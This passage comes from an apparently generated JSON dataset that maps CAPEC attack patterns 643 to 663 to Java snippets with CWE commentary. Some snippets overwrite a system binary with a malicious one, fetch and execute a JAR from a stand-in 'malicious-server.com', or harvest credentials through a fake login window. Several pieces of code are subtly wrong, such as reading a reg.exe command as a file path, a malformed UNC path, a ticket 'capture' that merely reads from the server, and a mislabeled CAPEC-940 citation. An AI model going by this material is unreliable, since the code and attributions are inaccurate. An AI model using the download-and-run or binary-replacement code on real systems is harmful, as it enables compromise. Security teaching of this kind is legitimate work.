        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableBinaryReplacement {\n    public static void main(String[] args) {\n        String binaryPath = \"/usr/local/bin/someBinary\";\n        String maliciousBinaryPath = \"/tmp/maliciousBinary\";\n\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File binaryFile = new File(binaryPath);\n        if (binaryFile.exists() && binaryFile.canWrite()) {\n            try {\n                // CWE-426: Untrusted Search Path\n                // CWE-78: OS Command Injection\n                // CWE-428: Unquoted Search Path or Element\n                // CWE-506: Embedded Malicious Code\n                Files.copy(Paths.get(maliciousBinaryPath), Paths.get(binaryPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n                System.out.println(\"Binary replaced successfully.\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Insufficient permissions to replace the binary.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where an adversary can replace a critical binary with a malicious one due to improper file permissions. The code checks if the binary at '/usr/local/bin/someBinary' is writable (CWE-732) and then replaces it with a malicious binary located at '/tmp/maliciousBinary'. This replacement is done without verifying the integrity or trustworthiness of the new binary (CWE-426, CWE-506). Additionally, the code does not handle potential OS command injection (CWE-78) or unquoted search paths (CWE-428), making it susceptible to various attacks. The main idea represented here is the 'Replace Binaries' attack pattern, where weak file permissions allow an adversary to replace critical binaries with malicious ones."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.List;\n\npublic class SharedDirectoryScanner {\n    public static void main(String[] args) {\n        String sharedDirPath = \"\\\\UNC\\share\\name\\\";\n        scanSharedDirectory(sharedDirPath);\n    }\n\n    public static void scanSharedDirectory(String path) {\n        File sharedDir = new File(path);\n        if (sharedDir.exists() && sharedDir.isDirectory()) {\n            File[] files = sharedDir.listFiles();\n            if (files != null) {\n                for (File file : files) {\n                    if (file.isFile()) {\n                        try {\n                            List<String> lines = Files.readAllLines(Paths.get(file.getAbsolutePath()));\n                            for (String line : lines) {\n                                System.out.println(\"Found in \" + file.getName() + \": \" + line);\n                            }\n                        } catch (IOException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                }\n            }\n        } else {\n            System.out.println(\"Shared directory does not exist or is not a directory.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might identify and read files from a shared directory on a system, which aligns with the CAPEC description of discovering connections between systems through shared folders. The code scans a specified UNC path (related to CWE-40) for files and reads their contents, potentially exposing sensitive information (CWE-200, CWE-552). The shared directory path is hardcoded, which could be exploited if the path is controlled by unintended actors (CWE-427). The code also does not check for proper access permissions, which could lead to privilege misuse (CWE-267)."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class PassTheHashExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        // Storing user credentials as hashes (CWE-836)\n        String username = \"user1\";\n        String password = \"password123\";\n        String passwordHash = hashPassword(password);\n        userDatabase.put(username, passwordHash);\n\n        // Simulating an attacker capturing the hash (CWE-522)\n        String capturedHash = passwordHash;\n\n        // Using the captured hash to authenticate (CWE-294)\n        if (authenticate(username, capturedHash)) {\n            System.out.println(\"Authentication successful using captured hash!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static String hashPassword(String password) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        byte[] hash = md.digest(password.getBytes());\n        StringBuilder hexString = new StringBuilder();\n        for (byte b : hash) {\n            hexString.append(String.format(\"%02x\", b));\n        }\n        return hexString.toString();\n    }\n\n    private static boolean authenticate(String username, String passwordHash) {\n        // Comparing the captured hash with the stored hash (CWE-836)\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(passwordHash);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Pass The Hash' attack. It stores user credentials as password hashes (CWE-836) and simulates an attacker capturing one of these hashes (CWE-522). The captured hash is then used to authenticate the user by comparing it with the stored hash (CWE-294). This example highlights the vulnerability of using password hashes for authentication and the risks associated with insufficiently protected credentials."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class KerberosTicketReplay {\n    private static final String SECRET_KEY = \"1234567890123456\"; // Insecure hardcoded key\n\n    public static void main(String[] args) throws Exception {\n        // Simulate capturing a Kerberos ticket\n        byte[] capturedTicket = captureTicket();\n\n        // Replay the captured ticket\n        replayTicket(capturedTicket);\n    }\n\n    private static byte[] captureTicket() throws Exception {\n        // Simulate capturing a ticket from the network (insecure transmission)\n        Socket socket = new Socket(\"victim-server\", 88);\n        InputStream in = socket.getInputStream();\n        ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[1024];\n        while ((nRead = in.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n        buffer.flush();\n        socket.close();\n        return buffer.toByteArray();\n    }\n\n    private static void replayTicket(byte[] ticket) throws Exception {\n        // Simulate replaying the captured ticket to gain unauthorized access\n        Socket socket = new Socket(\"victim-server\", 88);\n        OutputStream out = socket.getOutputStream();\n        out.write(ticket);\n        out.flush();\n        socket.close();\n    }\n\n    private static byte[] encryptTicket(byte[] ticket) throws Exception {\n        // Insecure encryption without proper key management\n        SecretKeySpec keySpec = new SecretKeySpec(SECRET_KEY.getBytes(), \"AES\");\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        return cipher.doFinal(ticket);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a 'Pass The Ticket' attack, where an adversary captures a Kerberos ticket from the network and replays it to gain unauthorized access to a system. The code highlights several security weaknesses: \n1. Insufficiently Protected Credentials (CWE-522): The ticket is captured from the network without encryption, making it susceptible to interception.\n2. Authentication Bypass by Capture-replay (CWE-294): The captured ticket is replayed to the server, bypassing the need for valid credentials.\n3. Use of Single-factor Authentication (CWE-308): The system relies solely on the ticket for authentication, without additional factors.\n4. Key Exchange without Entity Authentication (CWE-322): The encryption of the ticket uses a hardcoded key without verifying the identity of the communicating parties.\n5. Incorrect Conversion of Security Identifiers (CWE-1292): Although not explicitly shown, improper handling of security identifiers could lead to unauthorized access.\n\nThe code is intended to illustrate the vulnerabilities associated with the 'Pass The Ticket' attack and the importance of secure credential handling, multi-factor authentication, and proper key management."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.List;\n\npublic class PeripheralFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Example of searching for iOS backups\n            File backupDir = new File(System.getProperty(\"user.home\") + \"/AppData/Roaming/Apple Computer/MobileSync/Backup\");\n            if (backupDir.exists() && backupDir.isDirectory()) {\n                File[] backups = backupDir.listFiles();\n                if (backups != null) {\n                    for (File backup : backups) {\n                        System.out.println(\"Found iOS backup: \" + backup.getName());\n                    }\n                }\n            }\n\n            // Example of analyzing Windows registry for USB devices\n            List<String> registryOutput = Files.readAllLines(Paths.get(\"C:\\\\Windows\\\\System32\\\\reg.exe QUERY HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\\\USBSTOR\"));\n            for (String line : registryOutput) {\n                System.out.println(\"Registry entry: \" + line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Peripheral Footprinting' by attempting to gather information about connected peripheral devices. The code searches for iOS backups in a typical directory and reads the Windows registry to find entries related to USB storage devices. This represents the CAPEC's idea of obtaining information about attached peripherals to gain insights into the system. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and handling system-level information improperly (CWE-67)."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryDataCollector {\n    public static void main(String[] args) {\n        // Accessing the Windows registry using Java Preferences API\n        Preferences systemRoot = Preferences.systemRoot();\n        Preferences userRoot = Preferences.userRoot();\n\n        // Improper Authorization: No checks for user permissions\n        String sensitiveData = systemRoot.get(\"SensitiveKey\", \"default\");\n        System.out.println(\"Sensitive Data: \" + sensitiveData);\n\n        // Cleartext Storage in the Registry: Storing sensitive data in cleartext\n        userRoot.put(\"SensitiveKey\", \"SensitiveValue\");\n        System.out.println(\"Sensitive data stored in registry.\");\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might exploit weaknesses in authorization to gather and store sensitive information in the Windows registry. The code uses the Java Preferences API to access and manipulate registry data. It highlights two main vulnerabilities: \n1. Improper Authorization (CWE-285): The code does not perform any authorization checks before accessing sensitive data in the system registry.\n2. Cleartext Storage in the Registry (CWE-314): The code stores sensitive information in cleartext within the user registry.\n\nThis example embodies the CAPEC 'Collect Data from Registries' by showing how an attacker can exploit these weaknesses to gather and store sensitive information, potentially leading to further attacks."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import java.awt.AWTException;\nimport java.awt.Rectangle;\nimport java.awt.Robot;\nimport java.awt.Toolkit;\nimport java.awt.image.BufferedImage;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.imageio.ImageIO;\n\npublic class ScreenCapture {\n    public static void main(String[] args) {\n        try {\n            // Capture the screen\n            Robot robot = new Robot();\n            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());\n            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);\n            \n            // Save the captured image to a file\n            File file = new File(\"screenshot.png\");\n            ImageIO.write(screenFullImage, \"png\", file);\n            System.out.println(\"A screenshot is taken and saved!\");\n        } catch (AWTException | IOException ex) {\n            System.err.println(ex);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary could exploit the system's screen capture functionality to gather sensitive information. The code uses the `Robot` class to capture the entire screen and save it as a PNG file. This embodies the CAPEC 'Collect Data from Screen Capture' by showing how an attacker could programmatically take screenshots. The related CWEs provide additional context: CWE-267 (Privilege Defined With Unsafe Actions) is relevant because the code assumes the user has the necessary privileges to capture the screen, which could be exploited if those privileges are misconfigured. CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is also relevant, as the captured screenshot could contain sensitive information that should not be accessible to unauthorized users."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileUpload {\n    public static void main(String[] args) {\n        String userInputFileName = \"example.txt \"; // Trailing space\n        try {\n            File file = new File(userInputFileName.trim()); // Attempt to neutralize trailing space\n            if (file.exists()) {\n                System.out.println(\"File exists: \" + file.getCanonicalPath());\n                // Process the file based on its extension\n                if (userInputFileName.endsWith(\".txt \")) {\n                    System.out.println(\"Processing as a text file.\");\n                } else {\n                    System.out.println(\"Unknown file type.\");\n                }\n            } else {\n                System.out.println(\"File does not exist.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability where an adversary can add a trailing space to a file extension to manipulate how the file is processed. The code attempts to neutralize the trailing space by using the `trim()` method, but it still checks the original user input for the file extension, which includes the trailing space. This can lead to incorrect file type processing. The code highlights the risk of relying on file names or extensions for determining file behavior, as described in CWE-646. Additionally, it touches on the issues of path equivalence with trailing spaces (CWE-46) and internal whitespace (CWE-48)."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Part;\n\n@WebServlet(\"/upload\")\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = Paths.get(filePart.getSubmittedFileName()).getFileName().toString();\n        File uploads = new File(\"/var/www/uploads\");\n        File file = new File(uploads, fileName);\n        Files.copy(filePart.getInputStream(), file.toPath());\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The servlet allows users to upload files to the server without proper validation or authentication, embodying the CAPEC 'Upload a Web Shell to a Web Server'. The code does not check the file type (CWE-434), does not authenticate the user (CWE-287), and stores the uploaded file in a web-accessible directory (CWE-553). This can allow an attacker to upload a malicious web shell, which can then be executed remotely, potentially compromising the server."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import javax.sound.sampled.*;\nimport java.io.*;\n\npublic class EavesdroppingExample {\n    public static void main(String[] args) {\n        try {\n            // Obtain and open the microphone line\n            AudioFormat format = new AudioFormat(16000, 16, 1, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n            TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n            microphone.open(format);\n            microphone.start();\n\n            // Create a buffer to read the microphone data\n            byte[] buffer = new byte[1024];\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n\n            // Read data from the microphone and write to the output stream\n            while (true) {\n                int bytesRead = microphone.read(buffer, 0, buffer.length);\n                out.write(buffer, 0, bytesRead);\n\n                // Simulate sending the data over a cleartext channel\n                sendOverCleartextChannel(out.toByteArray());\n                out.reset();\n            }\n        } catch (LineUnavailableException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendOverCleartextChannel(byte[] data) {\n        // Simulate sending data over a cleartext channel\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}",
        "description": "This Java code snippet demonstrates a basic eavesdropping scenario where audio data is captured from a microphone and transmitted over a cleartext channel. The code opens a microphone line, reads audio data into a buffer, and then simulates sending this data over an unencrypted channel. This embodies the CAPEC concept of eavesdropping by capturing raw audio and transmitting it without protection, exposing sensitive information to unauthorized actors. The related CWEs are represented by the cleartext transmission (CWE-319) and the potential for unauthorized access to sensitive information (CWE-200)."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class KerberosAuth {\n    private static final String KERBEROS_TICKET = \"base64EncodedTicket\";\n    private static final String SERVER_ADDRESS = \"http://example.com/authenticate\";\n\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(SERVER_ADDRESS);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Authorization\", \"Kerberos \" + KERBEROS_TICKET);\n            conn.setDoOutput(true);\n\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(KERBEROS_TICKET.getBytes());\n                os.flush();\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                System.out.println(\"Authenticated successfully.\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of Kerberos authentication by sending a base64-encoded Kerberos ticket to a server. The code highlights several vulnerabilities related to the CAPEC and CWEs provided:\n\n1. **Insufficiently Protected Credentials (CWE-522)**: The Kerberos ticket is hardcoded and transmitted in plaintext, making it susceptible to interception.\n2. **Use of Single-factor Authentication (CWE-308)**: The code relies solely on the Kerberos ticket for authentication, lacking multi-factor authentication.\n3. **Authentication Bypass by Capture-replay (CWE-294)**: The code does not implement any mechanism to prevent replay attacks, allowing an attacker to reuse intercepted tickets.\n\nThe main idea of the CAPEC is to show how an adversary can use known Kerberos credentials to gain authenticated access to a system. This code snippet embodies that by demonstrating a simple, yet vulnerable, Kerberos authentication process."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String inputUsername = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputUsername, inputPassword)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        return USERNAME.equals(username) && PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple and vulnerable login system. The main idea of the CAPEC 'Use of Known Operating System Credentials' is embodied by hardcoding the username and password, which can be easily guessed or obtained by an adversary. The code also reflects several related CWEs:\n\n1. CWE-522: Insufficiently Protected Credentials - The credentials are stored in plain text within the code, making them susceptible to unauthorized retrieval.\n2. CWE-307: Improper Restriction of Excessive Authentication Attempts - There is no mechanism to limit the number of failed login attempts, making the system vulnerable to brute force attacks.\n3. CWE-308: Use of Single-factor Authentication - The system relies solely on a username and password for authentication, lacking additional security measures like two-factor authentication.\n4. CWE-309: Use of Password System for Primary Authentication - The system uses a password-based authentication mechanism, which has inherent weaknesses.\n5. CWE-262: Not Using Password Aging - There is no mechanism to enforce password changes over time.\n6. CWE-263: Password Aging with Long Expiration - Although not directly shown, the hardcoded password implies no expiration policy.\n7. CWE-654: Reliance on a Single Factor in a Security Decision - The authentication decision is based solely on the username and password, without additional checks or factors.\n\nOverall, this code snippet highlights the risks associated with using known operating system credentials and the importance of implementing more robust security measures."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class CredentialPromptImpersonation extends JFrame {\n    public CredentialPromptImpersonation() {\n        setTitle(\"Login\");\n        setSize(300, 150);\n        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        setLocationRelativeTo(null);\n\n        JPanel panel = new JPanel();\n        panel.setLayout(new GridLayout(3, 2));\n\n        JLabel userLabel = new JLabel(\"Username:\");\n        JTextField userText = new JTextField();\n        JLabel passwordLabel = new JLabel(\"Password:\");\n        JPasswordField passwordText = new JPasswordField();\n        JButton loginButton = new JButton(\"Login\");\n\n        panel.add(userLabel);\n        panel.add(userText);\n        panel.add(passwordLabel);\n        panel.add(passwordText);\n        panel.add(new JLabel());\n        panel.add(loginButton);\n\n        add(panel);\n\n        loginButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                String username = userText.getText();\n                String password = new String(passwordText.getPassword());\n                // Simulate storing credentials insecurely\n                System.out.println(\"Storing credentials: \" + username + \", \" + password);\n            }\n        });\n    }\n\n    public static void main(String[] args) {\n        SwingUtilities.invokeLater(new Runnable() {\n            @Override\n            public void run() {\n                new CredentialPromptImpersonation().setVisible(true);\n            }\n        });\n    }\n}",
        "description": "This Java code snippet creates a simple GUI application that impersonates a login prompt using Java Swing. The application captures the username and password entered by the user and prints them to the console, simulating insecure storage of credentials. This example embodies the CAPEC 'Credential Prompt Impersonation' by creating a fake login interface to steal user credentials. It also demonstrates CWE-522 (Insufficiently Protected Credentials) by printing the credentials in plain text, CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not distinguishing the fake prompt from a legitimate one, and CWE-798 (Use of Hard-coded Credentials) by potentially using hard-coded credentials in a real-world scenario."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableFileHandler {\n    public static void main(String[] args) {\n        String filePath = \"sensitive_data.txt\";\n        String tempFilePath = \"temp_data.txt\";\n        String sensitiveData = \"username=admin;password=secret\";\n\n        try {\n            // CWE-541: Inclusion of Sensitive Information in an Include File\n            FileWriter writer = new FileWriter(filePath);\n            writer.write(sensitiveData);\n            writer.close();\n\n            // CWE-532: Insertion of Sensitive Information into Log File\n            logSensitiveData(sensitiveData);\n\n            // CWE-377: Insecure Temporary File\n            File tempFile = new File(tempFilePath);\n            tempFile.createNewFile();\n            Files.write(Paths.get(tempFilePath), sensitiveData.getBytes());\n\n            // Adding data to increase file size (CAPEC-Adding Data)\n            FileWriter tempWriter = new FileWriter(tempFilePath, true);\n            for (int i = 0; i < 10000; i++) {\n                tempWriter.write(\"A\");\n            }\n            tempWriter.close();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void logSensitiveData(String data) {\n        // Simulate logging sensitive data\n        System.out.println(\"Logging: \" + data);\n    }\n}",
        "description": "This Java code snippet demonstrates several security weaknesses and the main idea of the CAPEC 'Avoid Security Tool Identification by Adding Data'. The code includes sensitive information in a file (CWE-541), logs sensitive information (CWE-532), and creates an insecure temporary file (CWE-377). Additionally, it adds a large amount of data to a temporary file to increase its size, which can help evade detection by security tools that may not handle large files effectively. This change in file size and content also alters the file's hash, making it harder for security tools to identify the file based on known hashes."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class VoicePhishingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to XYZ Bank. Please enter your account number:\");\n        String accountNumber = scanner.nextLine();\n        System.out.println(\"Please enter your password:\");\n        String password = scanner.nextLine();\n        \n        // Simulate a voice phishing attack\n        if (isPhishingCall()) {\n            System.out.println(\"Thank you for providing your details. Your account will be updated shortly.\");\n            // CWE-522: Insufficiently Protected Credentials\n            // Storing credentials insecurely\n            storeCredentials(accountNumber, password);\n        } else {\n            System.out.println(\"Authentication failed. Please try again.\");\n        }\n    }\n\n    private static boolean isPhishingCall() {\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // Simulate improper verification\n        return true; // Always returns true for demonstration purposes\n    }\n\n    private static void storeCredentials(String accountNumber, String password) {\n        // CWE-522: Insufficiently Protected Credentials\n        // Storing credentials in plain text (insecure)\n        System.out.println(\"Storing credentials: \" + accountNumber + \", \" + password);\n    }\n}",
        "description": "This Java code snippet simulates a voice phishing attack scenario. The user is prompted to enter their account number and password, which are then stored insecurely. The `isPhishingCall` method simulates improper verification of the communication channel, always returning true to represent a successful phishing attempt. The `storeCredentials` method demonstrates CWE-522 by storing the credentials in plain text, highlighting the vulnerability of insufficiently protected credentials. This code embodies the main idea of CAPEC-940 by showing how an adversary can solicit sensitive information through a voice call and improperly handle it."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the malicious update server\n            URL url = new URL(\"http://malicious-server.com/update\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Read the update file from the malicious server\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Execute the downloaded update without integrity check\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a client application downloads and executes a software update from a remote server without verifying the origin and integrity of the code. The URL points to a malicious server, and the downloaded file is executed directly. This embodies the CAPEC 'Malicious Automated Software Update via Spoofing' by showing how an attacker can trick a client into downloading and running a malicious update. The code also reflects CWE-494 (Download of Code Without Integrity Check) and CWE-506 (Embedded Malicious Code) by not performing any checks on the downloaded content before execution."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class JailbreakDetectionEvasion {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious_code.jar\");\n            URLConnection connection = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder code = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine);\n            }\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            // Dynamically load the downloaded code (simulated here as a string)\n            // In a real scenario, this would involve more complex class loading\n            executeDownloadedCode(code.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeDownloadedCode(String code) {\n        // Simulate execution of downloaded code\n        // CWE-78: OS Command Injection\n        try {\n            Runtime.getRuntime().exec(code);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application downloads and executes code from an untrusted source without performing integrity checks (CWE-494). The downloaded code is then executed, potentially allowing an adversary to inject malicious OS commands (CWE-78). This represents the CAPEC concept of 'Root/Jailbreak Detection Evasion via Hooking', where an adversary can force an application to load arbitrary code to bypass security checks. The code also highlights the inclusion of functionality from an untrusted control sphere (CWE-829), which is a common weakness in such scenarios."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import java.lang.reflect.Method;\n\npublic class RootDetectionBypass {\n    public static void main(String[] args) {\n        try {\n            // Simulate attaching a debugger\n            Class<?> debugClass = Class.forName(\"com.example.Debug\");\n            Method attachDebugger = debugClass.getMethod(\"attachDebugger\");\n            attachDebugger.invoke(null);\n\n            // Bypass root detection\n            if (isRooted()) {\n                System.out.println(\"Device is rooted. Bypassing root detection...\");\n                // Modify the binary or memory to bypass root detection\n                // This is a placeholder for the actual evasion logic\n            } else {\n                System.out.println(\"Device is not rooted.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isRooted() {\n        // Simulate a root detection check\n        // This is a placeholder for the actual root detection logic\n        return true;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of how an adversary might bypass root detection in a mobile application by attaching a debugger and modifying the application binary. The `attachDebugger` method simulates the insertion of a debugger into the program entry point. The `isRooted` method simulates a root detection check, which always returns true for demonstration purposes. If the device is detected as rooted, the code prints a message indicating that root detection is being bypassed. This represents the CAPEC's main idea of evading root/jailbreak detection via debugging. The code also touches on related CWEs by showing how debugging code can be misused (CWE-489), and how sensitive system information might be exposed or improperly managed (CWE-497, CWE-1323)."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableBrowser {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/malicious-code.jar\");\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"malicious-code.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n\n            inputStream.close();\n            outputStream.close();\n\n            // Load and execute the downloaded code without integrity check\n            Process process = Runtime.getRuntime().exec(\"java -jar malicious-code.jar\");\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable browser scenario where the browser downloads and executes a JAR file from a remote location without performing any integrity checks. This embodies the CAPEC 'Adversary in the Browser (AiTB)' by allowing an adversary to exploit the browser's functionality to manipulate traffic and execute potentially malicious code. The code also highlights CWE-494 (Download of Code Without Integrity Check) by not verifying the origin and integrity of the downloaded code, and CWE-506 (Embedded Malicious Code) by potentially executing malicious code. This scenario can lead to severe security breaches if an attacker manages to inject malicious code into the downloaded file."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "public class TransientExecutionExample {\n    private static final int SECRET = 0x12345678; // Sensitive data\n    private static final int ARRAY_SIZE = 256;\n    private static final int[] cache = new int[ARRAY_SIZE];\n\n    public static void main(String[] args) {\n        int index = getIndex(); // Speculative execution may mispredict this\n        if (index < ARRAY_SIZE) {\n            // Transient execution may access SECRET\n            int value = cache[index] + SECRET;\n            // Covert channel: cache timing side-channel\n            accessCache(value);\n        }\n    }\n\n    private static int getIndex() {\n        // Simulate branch prediction vulnerability\n        return (int) (Math.random() * (ARRAY_SIZE + 1)); // May return out-of-bounds index\n    }\n\n    private static void accessCache(int value) {\n        // Simulate cache access to create a timing side-channel\n        int temp = cache[value % ARRAY_SIZE];\n    }\n}",
